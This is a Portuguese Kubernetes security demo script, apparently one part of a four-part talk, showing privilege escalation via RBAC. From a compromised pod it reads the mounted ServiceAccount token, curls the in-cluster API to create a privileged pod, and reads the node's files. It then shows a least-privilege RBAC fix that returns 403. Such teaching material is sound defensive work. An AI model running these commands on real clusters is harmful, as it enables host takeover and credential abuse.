# Cavaleiro 2 — Executar (Privilege Escalation via RBAC)

> "Não precisa de root no host. Precisa do token certo."
> Você não escreveu `privileged`. O RBAC deixou o atacante escrever.

**Ataque:** o atacante já tem um shell num pod comprometido. Ele **não** precisa do seu kubectl
nem de acesso externo: todo pod já vem com o token da ServiceAccount montado em
`/var/run/secrets/...` **e** alcança o API server pelo DNS interno `https://kubernetes.default.svc`.
Um `curl` basta. Se a SA puder `create pods` (parece inofensivo), ele cria o pod privilegiado dele.

**Defesa:** least privilege no RBAC — tirar o `create` que o app não precisava.

> Por que não `privileged` + PSS? Porque `privileged` é exceção, e no 1.36 user namespaces já tira
> o "root do container = root do host". O que derruba cluster hoje é **permissão demais** — e isso
> o user namespaces não resolve.

---

## Roteiro

Tudo roda **de dentro do pod comprometido** (via `kubectl exec`), usando só o token montado.

### 1. O cenário: um app que pode "create pods"
```bash
kubectl apply -f cenario.yaml
```
Uma SA com permissão de criar pods ("o app orquestra workers") — parece inofensivo.

### 2. De dentro do pod, o token já fala com a API interna
```bash
kubectl -n c2-privileged exec app-comprometido -- sh -c \
  'curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
   https://kubernetes.default.svc/version'
```
*Resultado esperado:* a API responde. Sem kubectl externo, sem seu kubeconfig.
*Fala:* "O atacante não invade o API server de fora. Ele já está dentro do pod — e o pod nasceu com a credencial e a rota para a API."

### 3. Escalada: criar o pod privilegiado via API (POST)
```bash
kubectl -n c2-privileged exec -i app-comprometido -- sh -c \
  'curl -sk -X POST -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
   -H "Content-Type: application/yaml" \
   https://kubernetes.default.svc/api/v1/namespaces/c2-privileged/pods --data-binary @-' \
  < pod-privilegiado.yaml
```
*Resultado esperado:* a API responde `201` (criado).
*Fala:* "Você nunca escreveu `privileged: true`. Não precisou — bastou a SA poder criar pods."

### 4. Prova: o pod do atacante lê o node
```bash
kubectl -n c2-privileged exec pod-do-atacante -- cat /host/etc/os-release
```
*Resultado esperado:* sai o sistema do **node** (não do container). O host está exposto.

### 5. A defesa: RBAC sem `create`
```bash
kubectl apply -f defesa.yaml
```
Reaplica o mesmo Role, agora só com `get`/`list`. O token continua válido, mas sem o poder perigoso.

### 6. O mesmo ataque, agora negado
```bash
kubectl -n c2-privileged exec -i app-comprometido -- sh -c \
  'curl -sk -o /dev/null -w "%{http_code}\n" -X POST \
   -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
   -H "Content-Type: application/yaml" \
   https://kubernetes.default.svc/api/v1/namespaces/c2-privileged/pods --data-binary @-' \
  < pod-privilegiado.yaml
```
*Resultado esperado:* `403`. Mesmo token, mesma chamada — agora **Forbidden**.

---

## Reset
```bash
kubectl delete -f pod-privilegiado.yaml -f cenario.yaml --ignore-not-found
```

## Notas
- **`automountServiceAccountToken: false`** no pod (ou na SA) fecha o vetor inteiro quando o app não
  fala com a API — sem token montado, não há o que roubar.
- **PSS / Kyverno** continuam valendo como rede de segurança: barram o pod privilegiado mesmo que o
  RBAC falhe. Defesa em profundidade.
- **user namespaces** (`hostUsers: false`, GA no 1.36) neutralizam o escape de kernel, mas não o
  abuso de RBAC — são camadas diferentes.
- Audite RBAC com `kubectl auth can-i --list`, [rakkess](https://github.com/corneliusweig/rakkess)
  ou [kubectl-who-can](https://github.com/aquasecurity/kubectl-who-can): procure curingas e quem
  pode `create pods` / ler `secrets`.

---

[I · Entrar](cavaleiro-1-supply-chain.md) · **II · Executar** · [III · Movimentar](cavaleiro-3-network.md) · [IV · Roubar](cavaleiro-4-secrets.md) — [Material de apoio](../explicacao-4-cavaleiros.md)
